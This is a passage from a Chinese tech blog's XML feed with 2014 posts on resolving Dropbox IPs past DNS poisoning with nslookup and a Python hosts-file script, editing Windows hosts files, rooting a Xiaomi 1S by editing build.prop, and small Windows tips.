rel="noopener">OpenSSH</a></li><li><a href="http://www.vandyke.com/products/securecrt/" target="_blank" rel="noopener">SecureCRT</a> - 收费</li></ul></li><li>爬虫<ul><li><a href="http://scrapy.org/" target="_blank" rel="noopener">Scrapy</a> - Python爬虫框架</li><li><a href="http://www.httrack.com/" target="_blank" rel="noopener">HTTrack</a> - 爬取网站图片</li></ul></li><li>键盘鼠标共享<ul><li><a href="http://synergy-project.orgtp://www.dsploit.net/" target="_blank" rel="noopener">Synergy</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;update 2014-08-23&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;科学上网&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://code.google.com/p/goagent/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Goag
      
    
    </summary>
    
      <category term="Software" scheme="https://g2ex.top/categories/Software/"/>
    
    
  </entry>
  
  <entry>
    <title>如何获取Dropbox的可用HOSTS IP</title>
    <link href="https://g2ex.top/2014/08/14/Get-Dropbox-Hosts/"/>
    <id>https://g2ex.top/2014/08/14/Get-Dropbox-Hosts/</id>
    <published>2014-08-14T23:20:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、命令介绍"><a href="#一、命令介绍" class="headerlink" title="一、命令介绍"></a>一、命令介绍</h2><p>命令：<code>nslookup -vc www.dropbox.com 8.8.8.8</code></p><p>解释：<code>nslookup</code>(name server lookup)域名查询，用于查询DNS的记录。这里指定使用Google的<code>8.8.8.8</code>DNS服务器查询<code>www.dropbox.com</code>的IP地址。参数<code>vc</code>代表<code>Always use a virtual circuit when sending requests to the server.</code>，意思是向DNS发送的查询请求始终使用虚电路模式，也就是使用TCP协议查询域名的IP地址。</p><p><strong>为什么要是使用<code>vc</code>参数？</strong></p><p><code>nslookup</code>命令默认使用UDP协议查询，因为UDP协议的数据包是无序到达的，被GFW（Great Firewall of China，防火长城）构造的无效IP地址会先到达我们的电脑，我们会被<a href="http://zh.wikipedia.org/zh-cn/域名服务器缓存污染" title="维基百科" target="_blank" rel="noopener">DNS缓存污染</a>导致无法访问该域名。使用TCP协议可以保证在指定的DNS可用情况下得到正确的IP地址。</p><p>下图中没有使用<code>vc</code>参数得到的两条IP地址是被GFW污染的虚假IP，无法<code>ping</code>通。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-14_215415.webp" alt="nslookup命令图示" title="nslookup命令图示"></p><p>在浏览器里输入使用<code>vc</code>参数得到的<code>108.160.166.13</code>，则会跳转到Dropbox的主页。</p><p>要想正常是用Dropbox网页和客户端，不仅要知道正确的<code>www.dropbox.com</code>IP地址，还需要知道以下域名对应的IP地址。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dropbox.com</span><br><span class="line">forums.dropbox.com</span><br><span class="line">dl.dropboxusercontent.com</span><br><span class="line">d.dropbox.com</span><br><span class="line">client-lb.dropbox.com</span><br><span class="line">dl-client(1,2...999).dropbox.com</span><br><span class="line">dl-debug(1,2...40).dropbox.com</span><br><span class="line">client(1,2...99).dropbox.com</span><br><span class="line">notify(1,2...10).drobox.com</span><br></pre></td></tr></table></figure><p>手动获取这些域名的IP地址太费时，那就需要用到下面的脚本了。感谢 <a href="http://yannisxu.me/post/reconnect-dropbox" target="_blank" rel="noopener">Yannis Xu</a> 的基本脚本 和 <a href="http://www.doc001.com/post/2014-06-22" target="_blank" rel="noopener">doc001</a> 对脚本的完善。</p><h2 id="二、获取Dropbox-hosts-ip的Python脚本"><a href="#二、获取Dropbox-hosts-ip的Python脚本" class="headerlink" title="二、获取Dropbox hosts ip的Python脚本"></a>二、获取Dropbox hosts ip的Python脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLists</span><span class="params">(subdomain,start,end)</span>:</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(int(start),int(end)+<span class="number">1</span>):</span><br><span class="line">        ret.append(subdomain+str(i)+<span class="string">'.dropbox.com'</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDlClientLists</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> GetLists(<span class="string">'dl-client'</span>,<span class="number">1</span>,<span class="number">999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDlDebugLists</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> GetLists(<span class="string">'dl-debug'</span>,<span class="number">1</span>,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetClientLists</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> GetLists(<span class="string">'client'</span>,<span class="number">1</span>,<span class="number">99</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetNotifyLists</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> GetLists(<span class="string">'notify'</span>,<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">hosts = []</span><br><span class="line">hosts.extend([</span><br><span class="line">        <span class="string">'dropbox.com'</span>,</span><br><span class="line">        <span class="string">'www.dropbox.com'</span>,</span><br><span class="line">        <span class="string">'forums.dropbox.com'</span>,</span><br><span class="line">        <span class="string">'dl.dropboxusercontent.com'</span>,</span><br><span class="line">        <span class="string">'d.dropbox.com'</span>,</span><br><span class="line">        <span class="string">'client-lb.dropbox.com'</span></span><br><span class="line">        ])</span><br><span class="line">hosts.extend(GetDlClientLists())</span><br><span class="line">hosts.extend(GetDlDebugLists())</span><br><span class="line">hosts.extend(GetClientLists())</span><br><span class="line">hosts.extend(GetNotifyLists())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> hosts:</span><br><span class="line">    cmd = <span class="string">'nslookup -vc '</span> + h + <span class="string">' 8.8.8.8'</span></span><br><span class="line">    p = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line"></span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'Non-authoritative answer:'</span>):</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> valid <span class="keyword">and</span> line.startswith(<span class="string">'Address:'</span>):</span><br><span class="line">            ip = line.replace(<span class="string">'Address: '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">print</span> ip + <span class="string">' '</span> + h</span><br></pre></td></tr></table></figure><p>把脚本保存为<code>GetDropboxIP.py</code>，在命令行窗口或终端中执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetDropboxIP.py &gt; hosts_dropbox.txt</span><br></pre></td></tr></table></figure><p>最后把<code>hosts_dropbox.txt</code>中的记录放到系统hosts文件中。终于可以正常使用Dropbox了。</p><h2 id="三、另一个问题"><a href="#三、另一个问题" class="headerlink" title="三、另一个问题"></a>三、另一个问题</h2><p>毕竟我们在大陆，Google的<code>8.8.8.8</code>DNS服务器在国外，GFW位于两者中间，使用<code>nslookup -vc HOSTNAME 8.8.8.8</code>命令经常会出现丢包现象，更不要说连续查询上千条记录。所以，我们可以<strong>使用国外的计算机查询Dropbox的IP地址</strong>。</p><p>拥有国外VPS的同学就非常方便了。没有国外VPS的同学呢？让你的国外小伙伴来跑脚本把结果给你？还是自己动手吧。</p><p><a href="https://c9.io" target="_blank" rel="noopener">Cloud 9</a>、<a href="https://koding.com/" target="_blank" rel="noopener">Koding</a>、<a href="https://www.codebox.io/" target="_blank" rel="noopener">Codebox</a>、<a href="https://codenvy.com/" target="_blank" rel="noopener">Codenvy</a>、<a href="https://www.nitrous.io/" target="_blank" rel="noopener">Nitrous.IO</a> 等网站都是国外优秀的虚拟主机编程IDE，可以在这些免费主机中运行上面的脚本，这里以<code>Cloud 9</code>为例。</p><ol><li><p>首先需要注册一个免费账号，然后，在<code>DASHBOARD</code>里通过点击<code>CREATE NEW WORKSPACE</code>来创建新的工程，这里直接使用它默认创建的示例工程，选择<code>demo-project</code>，然后点击<code>START EDITING</code>。<img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-14_225540.webp" alt="创建工程并编辑" title="创建工程并编辑"></p></li><li><p>在Python目录下新建<code>GetDropboxIP.py</code>文件，并把脚本内容粘贴到文件中。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-14_230546.webp" alt="新建文件" title="新建文件"></p></li><li><p>在IDE下方的<code>bash</code>里执行:<code>python GetDropboxIP.py &gt; hosts_dropbox.txt</code><br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-14_231032.webp" alt="执行脚本" title="执行脚本"></p></li><li><p>等待几十秒，脚本执行完成后，在IDE左侧文件列表中右键点击生成的<code>hosts_dropbox.txt</code>，选择<code>Download</code>下载到本地。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-14_231306.webp" alt="下载hosts" title="下载hosts"></p></li><li><p>Enjoy.</p></li></ol><h2 id="四、参考内容"><a href="#四、参考内容" class="headerlink" title="四、参考内容"></a>四、参考内容</h2><ol><li><a href="http://yannisxu.me/post/reconnect-dropbox" target="_blank" rel="noopener">http://yannisxu.me/post/reconnect-dropbox</a></li><li><a href="http://www.doc001.com/post/2014-06-22" target="_blank" rel="noopener">http://www.doc001.com/post/2014-06-22</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、命令介绍&quot;&gt;&lt;a href=&quot;#一、命令介绍&quot; class=&quot;headerlink&quot; title=&quot;一、命令介绍&quot;&gt;&lt;/a&gt;一、命令介绍&lt;/h2&gt;&lt;p&gt;命令：&lt;code&gt;nslookup -vc www.dropbox.com 8.8.8.8&lt;/code&gt;&lt;/
      
    
    </summary>
    
    
      <category term="Hosts" scheme="https://g2ex.top/tags/Hosts/"/>
    
      <category term="Drobox" scheme="https://g2ex.top/tags/Drobox/"/>
    
  </entry>
  
  <entry>
    <title>科学利用HOSTS文件</title>
    <link href="https://g2ex.top/2014/08/13/Tips-of-Hosts/"/>
    <id>https://g2ex.top/2014/08/13/Tips-of-Hosts/</id>
    <published>2014-08-13T21:45:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>hosts文件是一个用于储存计算机网络中各节点信息的计算机文件。这个文件负责将主机名映射到相应的IP地址。hosts文件通常用于补充或取代网络中DNS的功能。和DNS不同的是，计算机的用户可以直接对hosts文件进行控制。——<a href="http://zh.wikipedia.org/wiki/Hosts%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">维基百科</a></p></blockquote><p>我们在浏览器中输入域名访问网站时，DNS（Domain Name System）会把域名“解释”为网站的IP地址，这个解析的过程如下图所示：</p><p><img src="http://i.msdn.microsoft.com/dynimg/IC195944.gif" alt="DNS解析过程" title="DNS解析过程"></p><p>在图中可以看到，DNS解析时首先会使用本地DNS缓存，这时会查询本地hosts文件。如果本地没有找到DNS记录，则要去DNS服务器去查询。</p><p>如果我们查询的DNS服务器返回给我们的IP地址是其恶意构造出来的，把域名指向了不正确的IP地址，这就是<code>DNS缓存污染</code>（又称为<code>DNS缓存投毒</code>）。</p><p>对于DNS缓存污染，我们可以在计算机中指定可信的DNS服务器，比如Google的<code>8.8.8.8</code>和OpenerDNS的<code>42.120.21.30</code>，不过这两个在大陆都已经中枪牺牲了，曾经他们可以解析出Google、Drobox、Twitter等IP。<br>对付DNS缓存污染的另外一个办法就是修改本地hosts，在hosts中加入被污染的域名和可用的IP地址，因为在上文得知，本地hosts先于DNS服务器解析。</p><p>hosts文件中每一行作为一条记录，以<code>#</code>开头的行是注释行。hosts记录的格式为：<code>IP地址 域名</code>，例如<code>127.0.0.1 localhost</code>的意思是把<code>localhost</code>的域名解析为<code>127.0.0.1</code>的IP地址。</p><p>XP/7/8/8.1的hosts位于系统盘的<code>Windows\System32\drivers\etc</code>目录下，Mac/Linux/Android的hosts位于<code>/etc/</code>目录下。Windows XP/7中修改方法见《Windows中修改hosts的方法》。</p><h2 id="在哪里可以获取现成的hosts文件？"><a href="#在哪里可以获取现成的hosts文件？" class="headerlink" title="在哪里可以获取现成的hosts文件？"></a>在哪里可以获取现成的hosts文件？</h2><ol><li><a href="https://code.google.com/p/huhamhire-hosts/" title="huhamhire-hosts" target="_blank" rel="noopener">huhamhire-hosts</a>——可以去广告、屏蔽恶意网站、科学上网</li><li><a href="https://code.google.com/p/smarthosts/" title="smarthosts" target="_blank" rel="noopener">smarthosts</a>——主要用于科学上网</li><li><del><a href="https://www.projecth.us/sources" target="_blank" rel="noopener">projecth.us-hosts</a></del></li><li>…</li></ol><blockquote><p>PS：<br>最近Dropbox又中枪了，在之后的文章中会介绍如何手动获取Dropbox可用hosts中的IP。</p></blockquote><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ol><li><a href="http://msdn.microsoft.com/zh-cn/library/cc775637%28v=ws.10%29.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/zh-cn/library/cc775637(v=ws.10).aspx</a></li><li><a href="http://zh.wikipedia.org/wiki/Hosts%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Hosts文件</a></li><li><a href="http://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/域名劫持</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;hosts文件是一个用于储存计算机网络中各节点信息的计算机文件。这个文件负责将主机名映射到相应的IP地址。hosts文件通常用于补充或取代网络中DNS的功能。和DNS不同的是，计算机的用户可以直接对hosts文件进行控制。——&lt;a href=&quot;ht
      
    
    </summary>
    
    
      <category term="Hosts" scheme="https://g2ex.top/tags/Hosts/"/>
    
  </entry>
  
  <entry>
    <title>Windows中修改HOSTS的方法</title>
    <link href="https://g2ex.top/2014/08/13/Modify-Windows-Hosts/"/>
    <id>https://g2ex.top/2014/08/13/Modify-Windows-Hosts/</id>
    <published>2014-08-13T20:45:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>Windows XP/7/8/8.1的hosts位于系统盘的<code>Windows\System32\drivers\etc</code>目录下。hosts文件默认的权限只有读取和执行，因此需要在修改hosts之前需要赋予当前用户<code>完全控制</code>的权限，之后才可以用编辑器（Notepad++/写字板等）写入<code>IP 域名</code>记录。</p><h2 id="Windows-7修改hosts操作步骤"><a href="#Windows-7修改hosts操作步骤" class="headerlink" title="Windows 7修改hosts操作步骤"></a>Windows 7修改hosts操作步骤</h2><ol><li><p>右击hosts文件选择<code>属性</code> | <code>安全</code>选项卡 | <code>编辑(E)</code> | 选中<code>Users (YourName\Users)</code> | 勾选<code>完全控制</code>，确定后便可以修改hosts文件。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-13_201217.webp" alt="Windows 7修改hosts权限" title="Windows 7修改hosts权限"></p></li><li><p>修改后防止其他程序对hosts修改，只勾选<code>允许</code>列的<code>读取和执行</code>、<code>读取</code>。</p></li></ol><h2 id="Windows-XP修改hosts操作步骤"><a href="#Windows-XP修改hosts操作步骤" class="headerlink" title="Windows XP修改hosts操作步骤"></a>Windows XP修改hosts操作步骤</h2><ol><li><p>点击<code>我的电脑</code>菜单栏中的<code>工具</code> | <code>文件夹选项</code> | <code>查看</code> | 把<code>使用简单文件共享(推荐)</code>前面的钩去掉。否则在下一步中不会看到hosts属性中的<code>安全</code>选项卡。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-13_210635.webp" alt="勾掉简单文件共享" title="勾掉简单文件共享"></p></li><li><p>右击hosts文件选择<code>属性</code> | <code>安全</code>选项卡 | <code>用户和组名称(G)</code>中选择<code>Users (YourName\Users)</code> | <code>允许</code>列勾选<code>完全控制</code>，确定后便可以修改hosts文件。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-08-13_200315.webp" alt="Windows XP修改hosts权限" title="Windows XP修改hosts权限"></p></li><li><p>修改之后为了防止其他程序对hosts修改，在<code>拒绝</code>列勾选<code>写入</code>。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Windows XP/7/8/8.1的hosts位于系统盘的&lt;code&gt;Windows\System32\drivers\etc&lt;/code&gt;目录下。hosts文件默认的权限只有读取和执行，因此需要在修改hosts之前需要赋予当前用户&lt;code&gt;完全控制&lt;/code&gt;的权限
      
    
    </summary>
    
    
      <category term="Hosts" scheme="https://g2ex.top/tags/Hosts/"/>
    
  </entry>
  
  <entry>
    <title>小米1S折腾记</title>
    <link href="https://g2ex.top/2014/07/10/Mi1S-Notes/"/>
    <id>https://g2ex.top/2014/07/10/Mi1S-Notes/</id>
    <published>2014-07-10T23:35:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>两年前入手了小米1S，4吋屏幕，800万+200万摄像头，双核CPU，1G RAM，4G ROM，当时1499￥价格的性价比几乎没有其他手机能比，重点是它的ROM用起来非常舒服，于是，不间断地刷机，一直用到现在。</p><p>我不是小米的粉丝，也不会成为任何一种手机的粉丝，相反，自从小米1S的最后一个V4稳定版的ICS 24.0 ROM发布之后，很长时间里MIUI团队再也没为小米1和小米1S更新过稳定版ROM，精力全部放在了米2/2S等新机型上。多次刷过V5的开发版，虽然人性化了很多，但图标变丑了，排列紧凑了，系统的圆角也太明显了，而且彻底移除了Google服务框架，再也没跟朋友推荐过小米。半年后终于发现了V5的稳定版JMACNAH1.0，又过了N个月，MIUI团队发布了稳定版JMACNBD4.0。</p><p>MIUI ROM的稳定版是不支持Root的，刚刚发布JMACNBD4.0的时候苦于没法Root，又刷回了ICS 24.0。当发现了geohot大神的towelroot工具之后，想试试这个工具对JMACNBD4.0是不是有效，很不幸，没能Root成功。</p><p>然后，就发现了下面的Root办法，修改稳定版卡刷包ROM的版本信息，伪装成开发版本，达到开启Root的目的。该方法不需要借助第三方ROOT工具，唯一的缺点是需要改写版本号（只是版本号的名称发生变化，系统真正版本不变）。</p><h1 id="进入正文"><a href="#进入正文" class="headerlink" title="进入正文"></a>进入正文</h1><h2 id="稳定版Root"><a href="#稳定版Root" class="headerlink" title="稳定版Root"></a>稳定版Root</h2><p>在<a href="http://www.miui.com/getrom-1.html" title="MIUI ROM 下载" target="_blank" rel="noopener">MIUI下载页面</a>下载MIUI JMACNBD4.0稳定版完整卡刷包，下载后名字是<code>miui_Mioneplus_JMACNBD4.0_4e30e38568_4.1.zip</code>，同样在这个页面，可以看到开发版的最新版本是<code>4.7.4</code>。</p><ol><li>保证手机刷上了稳定版ROM，也可以先把原版的JMACNBD4.0刷到手机上。【<a href="http://www.miui.com/shuaji-300.html" title="MIUI ROM 刷机教程" target="_blank" rel="noopener">刷机教程</a>】</li><li>在电脑上用WinRAR打开卡刷包(.zip文件)，在路径<code>system</code>下找到<code>build.prop</code>文件，用写字板或其他编辑器打开该文件(不推荐用记事本打开，因为记事本不会显示换行)。</li><li>在<code>build.prop</code>文件中，把第5行<code>build.version.incremental=JMACNBD4.0</code>中的<code>JMACNBD4.0</code>改成<code>4.7.4</code> (这里可以是任意的开发版的版本号)，之所以这样做是为了骗过系统让它认为这是开发版，就可以在授权管理中打开Root选项了。</li><li>将改写的文件保存，WinRAR会提示<code>文件&quot;build.prop&quot;已修改。您希望在压缩文件里更新它吗？</code>，点<code>是</code>把更改保存进原刷机包(.zip)中。</li><li>将修改后的完整刷机包拷入SD卡，进入系统更新，选择该安装包，刷上即可(注意不能通过recovery刷，通过recovery刷会显示签名不对)。</li></ol><h2 id="安装Google服务框架"><a href="#安装Google服务框架" class="headerlink" title="安装Google服务框架"></a>安装Google服务框架</h2><p>使用<a href="http://shuaji.360.cn/root/" title="360一键Root" target="_blank" rel="noopener">360一键Root</a>中的工具项<code>安装Google服务</code>功能可以一键安装gapp。</p><p>但是360一键Root要求手机的<code>/system</code>目录至少要有20M空间才可以安装Google服务，所以还要先安装上<a href="http://soft.shouji.com.cn/down/17849.html" title="R.E. 下载" target="_blank" rel="noopener">R.E管理器</a>把<code>/system/app</code>目录下的一些体积大的apk先移动到SD卡上，装完Google服务之后再移动回来。</p><h2 id="系统精简"><a href="#系统精简" class="headerlink" title="系统精简"></a>系统精简</h2><p>这个步骤可以在安装Google服务框架之前进行。</p><p>因为我不使用小米服务框架，所以连同小米服务框架的apk都被我移到了SD卡上作为备份保存了起来。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CloudService.apk                // 小米云服务</span><br><span class="line">Email.apk                       // Email应用</span><br><span class="line">Exchange2.apk                   // 邮件Exchange服务</span><br><span class="line">GameCenter.apk                  // 小米游戏中心</span><br><span class="line">GameCenterSDKService.apk        // 小米游戏框架</span><br><span class="line">GoogleContactsSyncAdapter.apk   // Google联系人同步</span><br><span class="line">PaymentService.apk              // 小米支付服务</span><br><span class="line">QuickSearchBox.apk              // 快速搜索小工具条</span><br><span class="line">SuperMarket.apk                 // 小米应用商店</span><br><span class="line">Transfer.apk                    // 小米快传</span><br><span class="line">Updater.apk                     // 为了防止提示更新</span><br><span class="line">XiaomiServiceFramework.apk      // 小米服务框架</span><br></pre></td></tr></table></figure><p>注意，在米1/1S的V5稳定版ROM中，不推荐删除<code>GuardProvider.apk</code>，否则<code>安全中心</code>就没法使用了。而在<code>ICS 24.0</code>及之前版本中，还没有集成<code>安全中心</code>，是可以删除<code>GuardProvider.apk</code>的。</p><p>生命不止，折腾不已。</p><hr><p><code>2014/7/14 更新</code></p><p>几天后，还是给1S换回了V4版本。同样也可以用这个方法Root。因为MIUI V4最终开发版的版本号是<code>3.2.22</code>，把ICS 24刷机包<code>build.prop</code>文件中<code>ro.build.version.incremental=ICS24.0</code>改为<code>ro.build.version.incremental=3.2.22</code>刷机即可开启Root。</p><p><del>另外，360一键Root已经移除安装Google服务框架的功能了。可以在手机里安装<a href="http://app.mi.com/detail/36925" title="谷歌应用下载器" target="_blank" rel="noopener"><code>谷歌应用下载器</code></a>。</del></p><hr><p><code>2014/10/21 更新</code></p><p>现在<code>360一键Root</code>已经支持小米1S V5系统了，可以安装小米1S的V5稳定版后，使用<code>360一键Root</code>来获取Root权限。</p><p>至于安装Google服务框架，小米市场提供的谷歌应用下载器会出现解析包错误，推荐使用手机乐园的<a href="http://soft.shouji.com.cn/down/26330.html" target="_blank" rel="noopener"><code>谷歌安装器</code></a>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;两年前入手了小米1S，4吋屏幕，800万+200万摄像头，双核CPU，1G RAM，4G ROM，当时1499￥价格的性价比几乎没有其他手机能比，重点是它的ROM用起来非常舒服，于是，不间断地刷机，一直用到现在。&lt;/p&gt;
&lt;p&gt;我不是小米的粉丝，也不会成为任何一种手机的粉丝
      
    
    </summary>
    
    
      <category term="MIUI" scheme="https://g2ex.top/tags/MIUI/"/>
    
  </entry>
  
  <entry>
    <title>保存Google Translate的朗读声音</title>
    <link href="https://g2ex.top/2014/06/19/Save-Google-Translate-Voices/"/>
    <id>https://g2ex.top/2014/06/19/Save-Google-Translate-Voices/</id>
    <published>2014-06-19T23:28:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>Google Translate的声音越来越好听了，怎么把她的朗读声音保存下来呢？</p><p>其实用不着录音软件，在Windows中通过查找Internet Explorer浏览器的临时文件就可以把朗读的MP3文件找出来。</p><ol><li><p>打开IE（这里是在Windows 7中使用的IE 11），在<code>工具</code>中找到<code>Internet 选项</code>，<code>浏览历史记录</code>的下面有个<code>删除</code>和<code>设置</code>按钮，为了后续步骤的方便，这里可以先点击<code>删除</code>按钮清空一下临时文件、历史记录和Cookie等，然后点击<code>设置</code>按钮，如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-06-19_212311.webp" alt="清空临时文件后点击设置" title="清空临时文件后点击设置"><br>点击<code>查看文件</code>就可以打开IE的临时文件目录了，如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-06-19_212413.webp" alt="查看临时文件目录" title="查看临时文件目录"><br>IE的临时目录一般位于<code>C:\Users\你的用户名\AppData\Local\Microsoft\Windows\Temporary Internet Files</code>下。</p></li><li><p>打开<a href="https://translate.google.com/" title="Google Translate" target="_blank" rel="noopener">Google Translate</a>，输入文字，点击朗读的小喇叭<i class="icon-volume-up"></i>，刷新一下IE的临时目录，多出来的MP3文件就是刚刚听到的声音了。如果IE临时目录中没有出现MP3文件，试着 <strong>以管理员身份运行</strong> IE。</p></li><li><p>如果在Google Translate中输入的文字太多，在IE的临时目录下会生成多个MP3文件，可以巧用WinRAR把多个MP3文件合并为一个。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Google Translate的声音越来越好听了，怎么把她的朗读声音保存下来呢？&lt;/p&gt;
&lt;p&gt;其实用不着录音软件，在Windows中通过查找Internet Explorer浏览器的临时文件就可以把朗读的MP3文件找出来。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;打开IE（这里
      
    
    </summary>
    
    
      <category term="Google" scheme="https://g2ex.top/tags/Google/"/>
    
  </entry>
  
  <entry>
    <title>巧用WinRAR合并MP3文件</title>
    <link href="https://g2ex.top/2014/06/19/Merge-MP3s-into-One/"/>
    <id>https://g2ex.top/2014/06/19/Merge-MP3s-into-One/</id>
    <published>2014-06-19T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>WinRAR版本：5.01</p><p>选中多个MP3文件，点击右键选择<code>添加到压缩文件(A)...</code>，在弹出的WinRAR窗口中把<code>压缩文件名</code>改为以<code>.mp3</code>结尾，<code>压缩方式</code>选择<code>存储</code>，点击<code>确定</code>，生成的新文件就是合并之后的MP3了。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-06-19_222903.webp" alt="文件名和参数设置" title="文件名和参数设置"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WinRAR版本：5.01&lt;/p&gt;
&lt;p&gt;选中多个MP3文件，点击右键选择&lt;code&gt;添加到压缩文件(A)...&lt;/code&gt;，在弹出的WinRAR窗口中把&lt;code&gt;压缩文件名&lt;/code&gt;改为以&lt;code&gt;.mp3&lt;/code&gt;结尾，&lt;code&gt;压缩方式&lt;/code&gt;选
      
    
    </summary>
    
    
      <category term="WinRAR" scheme="https://g2ex.top/tags/WinRAR/"/>
    
  </entry>
  
  <entry>
    <title>彻底清除搜狗输入法SGImeGuard进程</title>
    <link href="https://g2ex.top/2014/05/19/Kill-SGImeGuard-Completely/"/>
    <id>https://g2ex.top/2014/05/19/Kill-SGImeGuard-Completely/</id>
    <published>2014-05-19T23:26:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
